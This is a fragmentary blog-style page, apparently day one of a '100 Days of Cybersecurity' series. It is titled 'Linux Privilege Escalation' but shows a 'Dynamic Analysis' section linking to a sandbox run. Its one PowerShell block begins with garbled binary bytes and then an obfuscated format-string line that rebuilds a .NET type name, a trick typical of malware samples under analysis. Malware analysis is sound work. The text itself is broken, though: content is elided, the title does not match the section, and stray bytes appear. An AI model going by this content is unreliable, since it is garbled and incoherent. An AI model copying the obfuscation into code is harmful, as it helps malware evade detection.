---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/b1357428-9893-4400-96c9-69e05733354a"> Linux Privilege Escalation 🦁
...
## 100 Day's Of Cybersecurity - Day 1
...
## Dynamic Analysis ➡️ [app.any.run](https://app.any.run/tasks/b35e3e6a-257d-489a-8b3b-81f9d4b05c3d/)
...
```powershell
<ì®È^,Â)Ý£-ÊW']zÐ SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')) ;   
